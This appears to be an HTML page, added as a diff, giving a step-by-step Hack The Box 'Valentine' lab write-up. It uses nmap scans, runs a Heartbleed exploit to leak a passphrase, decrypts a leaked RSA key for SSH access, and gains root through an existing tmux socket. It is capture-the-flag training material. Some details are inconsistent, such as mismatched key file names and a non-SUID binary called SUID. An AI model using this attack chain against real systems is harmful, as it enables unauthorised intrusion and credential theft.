@@ -1,0 +1,196 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB Valentine</h1>
+    <p class="text">Difficulty : Easy | UserDifficulty : 4.0</p>
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV &lt;target_ip&gt; --min-rate=2000</u>
+PORT      STATE    SERVICE       VERSION
+22/tcp    open     ssh           OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
+|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
+|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
+80/tcp    open     http          Apache httpd 2.2.22 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+443/tcp   open     ssl/http      Apache httpd 2.2.22 ((Ubuntu))
+| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
+| Not valid before: 2018-02-06T00:45:25
+|_Not valid after:  2019-02-06T00:45:25
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+|_ssl-date: 2025-10-04T02:35:09+00:00; +12m41s from scanner time.</code></pre></div>
+
+<p class="text">SSH, HTTP and HTTPs are open on target machine. But there are other interesting information. Look at the OpenSSH and Apache version. It revealed that OpenSSH 5.9p1 was released on February 23, 2011 with google research. Also, Apache httpd 2.2.22 was released on January 31, 2012. The services expose very old versions, which strongly suggests there may be known vulnerabilities. Version strings alone aren't conclusive, so let's verify with active checks and deeper enumeration.</p>
+
+
+<div class="code-box"><pre><code>└─$ <u>sudo nmap --script=vuln &lt;target_ip&gt;</u>
+<u class="green">SNIP...</u>
+| ssl-heartbleed: 
+|   VULNERABLE:
+|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
+|     State: VULNERABLE
+|     Risk factor: High
+|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
+|           
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
+|       http://cvedetails.com/cve/2014-0160/
+|_      http://www.openssl.org/news/secadv_20140407.txt 
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+<u class="green">...SNIPPED</u></code></pre></div>
+
+<h2 class="subtitle">Foothold</h2>
+
+
+<p class="text">There is a vulnerability which is well-known as <u>Heartbleed</u>. <br>An attacker sends a tiny payload but claims a big length; the server echoes back that many bytes, copying past the real payload into its own memory (up to ~64 KB). Repeating this leaks sensitive data (cookies, credentials, even private keys). Affects OpenSSL 1.0.1-1.0.1f / 1.0.2-beta, fixed in 1.0.1g or by disabling heartbeats.</p>
+
+<p class="text">Let's exploit this. We can find exploit code with searchsploit.</p>
+
+<div class="code-box"><pre><code>└─$ <u>searchsploit heartbleed</u>                      
+----------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                 |  Path
+----------------------------------------------------------------------------------------------- ---------------------------------
+OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple SSL/TLS Vers | multiple/remote/32764.py
+OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (1)                            | multiple/remote/32791.c
+OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (2) (DTLS Support)             | multiple/remote/32998.c
+OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure                               | multiple/remote/32745.py
+----------------------------------------------------------------------------------------------- ---------------------------------</code></pre></div>
+
+<div class="code-box"><pre><code>└─$ <u>searchsploit -p multiple/remote/32745.py</u>  
+
+  Exploit: OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure
+      URL: https://www.exploit-db.com/exploits/32745
+     Path: <u>/usr/share/exploitdb/exploits/multiple/remote/32745.py</u>
+    Codes: CVE-2014-0346, OSVDB-105465, CVE-2014-0160
+ Verified: True
+File Type: Python script, ASCII text executable
+</code></pre></div>
+
+<div class="code-box"><pre><code>└─$ <u>python2 /usr/share/exploitdb/exploits/multiple/remote/32745.py 10.129.232.136 > heartbeat</u>
+└─$ <u>cat heartbeat | more</u>
+<u class="green">SNIP...</u>
+00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E  ....#.......0.0.
+  00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co
+  00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl
+  0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo
+  0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C
+  0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4
+  0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=<u>aGVhc</u>
+  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  <u>nRibGVlZGJlbGlld</u>
+  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D 81  <u>mV0aGVoeXBlCg==</u>.
+  0160: 19 EC 8D 99 FD 9B F5 64 94 F9 59 25 9B 37 42 92  .......d..Y%.7B.
+  0170: 47 86 7A 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  G.z.............
+<u class="green">...SNIPPED</u></code></pre></div>
+
+
+<p class="text">This snippet returned <u>base64 encoded</u> text. Let's decode it and see the raw text.</p>
+
+<div class="code-box"><pre><code>└─$ <u>echo 'aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==' | base64 -d</u>
+heartbleedbelievethehype</code></pre></div>
+
+<p class="text">Something like password is returned. Though we found password like stuff, we seem to have to keep enumeration. We'll take a note and keep forwarding.</p>
+
+
+
+<div class="code-box"><pre><code>└─$ <u>feroxbuster -u http://valentine.htb/ > ferox.txt</u>
+└─$ <u>grep -E '200|301' ferox.txt</u>
+301      GET        9l       28w      312c http://valentine.htb/dev => http://valentine.htb/dev/
+200      GET        2l     1794w     5383c <u>http://valentine.htb/dev/hype_key</u>
+200      GET        8l       39w      227c http://valentine.htb/dev/notes.txt
+200      GET        1l        2w       38c http://valentine.htb/index
+200      GET      620l     3539w   275344c http://valentine.htb/omg.jpg
+200      GET        1l        2w       38c http://valentine.htb/
+200      GET       25l       54w      552c http://valentine.htb/decode.php
+200      GET       27l       54w      554c http://valentine.htb/encode</code></pre></div>
+
+<p class="text">There is a file looks important. </p>
+
+
+<div class="code-box"><pre><code>└─$ <u>curl http://valentine.htb/dev/hype_key</u>                          
+2d 2d 2d 2d 2d 42 45 47 49 4e 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 0d 0a 50 72 6f 63 2d 54 79 70 65 3a 20 34 2c 45 4e 43 52 59 50 54 45 44 0d 0a 44 45 4b 2d 49 6e 66 6f 3a 20 41 45 53 2d 31 32 38 2d 43 42 43 2c 41 45 42 38 38 43 31 34 30 46 36 39 42 46 32 30 37 34 37 38 38 44 45 32 34 41 45 34 38 44 34 36 0d 0a 0d 0a 44 62 50 72 4f 37 38 6b 65 67 4e 75 6b 31 44 41 71 6c 41 4e 35 6a 62 6a 58 76 30 50 50 73 6f 67 33 6a 64 62 4d 46 53 38 69 45 39 70 33 55 4f 4c 30 6c 46 30 78 66 37 50 7a <br>...</code></pre></div>
+
+<p class="text">There are hex strings. </p>
+
+<div class="code-box"><pre><code>└─$ <u>curl http://valentine.htb/dev/hype_key |  xxd -r -p > hype_key</u>
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  5383  100  5383    0     0  28926      0 --:--:-- --:--:-- --:--:-- 29097</code></pre></div>
+
+
+<div class="code-box"><pre><code>└─$ <u>openssl rsa -in hype_key -out hype_key_rsa </u>
+
+Enter pass phrase for hype_key: <u class="green">#Try with password we got before : heartbleedbelievethehype
+writing RSA key</u></code></pre></div>
+
+<p class="text">We might be able to establish ssh connection with this gererated RSA KEY.</p>
+
+<div class="code-box"><pre><code>└─$ <u>ssh -i hype_key_rsa hype@&lt;target_ip&gt;</u>
+sign_and_send_pubkey: no mutual signature supported
+hype@10.129.232.136's password: </code></pre></div>
+
+<p class="text">However, we cannot get response. The stem of problem can be out-of-date ssh. Try it again with more detailed command.</p>
+
+<div class="code-box"><pre><code>└─$ <u>ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i hype_key_decrypted hype@@&lt;target_ip&gt;</u>
+Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com/
+
+New release '14.04.5 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+hype@Valentine:~$ </code></pre></div>
+
+<p class="text">We got ssh connection with an user hype.</p>
+
+
+
+<h2 class="subtitle">PrivEsc</h2>
+<p class="text">Though we got ssh, we cannot see sudo -l because we have no password for user hype. We need to find another vector for PrivEsc.</p>
+
+<div class="code-box"><pre><code>hype@Valentine:~$ history
+    1  exit
+    2  exot
+    3  exit
+    4  ls -la
+    5  cd /
+    6  ls -la
+    7  cd .devs
+    8  ls -la
+    9  tmux -L dev_sess 
+   10  tmux a -t dev_sess 
+   11  tmux --help
+   12  tmux -S /.devs/dev_sess 
+   13  exit</code></pre></div>
+
+   <p class="text">We can find the one with history command. Hype used tmux to do something. Let's dig into this command.</p>
+   <div class="code-box"><pre><code>hype@Valentine:~$ which tmux
+/usr/bin/tmux
+hype@Valentine:~$ ls -la /usr/bin/tmux
+-rwxr-xr-x 1 <u>root</u> <u>root</u> 421944 Feb 13  2012 /usr/bin/tmux</code></pre></div>
+
+<p class="text">This file has root SUID.</p>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/valentine/1.png' %}" alt="">
+    <p class="text">Gtfobins says it uses specific socket and if we have permission, we can access there. Therefore, we can get root command line with command hype used before.</p>
+</div>
+
+<div class="code-box"><pre><code>hype@Valentine:~$ tmux -S /.devs/dev_sess 
+<u>root@Valentine:/home/hype#</u>
+</code></pre></div>
+
+<p class="text">You can find root flag in /root/root.txt</p>
+
+
+</body>
+</html>
